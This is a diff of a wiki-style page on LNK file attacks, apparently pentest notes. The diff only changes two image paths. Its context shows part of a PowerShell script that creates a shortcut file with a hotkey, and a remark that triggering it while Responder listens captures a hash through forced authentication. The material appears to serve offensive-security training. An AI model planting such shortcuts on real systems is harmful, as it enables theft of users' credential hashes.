@@ -1,6 +1,6 @@
 # 🗄️ LNK File Attacks
 
-<figure><img src="../../../../.gitbook/assets/image (7) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (7) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ```
 $objShell = New-Object -ComObject WScript.shell
@@ -13,7 +13,7 @@ $lnk.HotKey = "Ctrl+Alt+T"
 $lnk.Save()
 ```
 
-<figure><img src="../../../../.gitbook/assets/image (8) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (8) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 What will happen if we have responder listening and this file is triggered, we will get a hash and force auth:
 
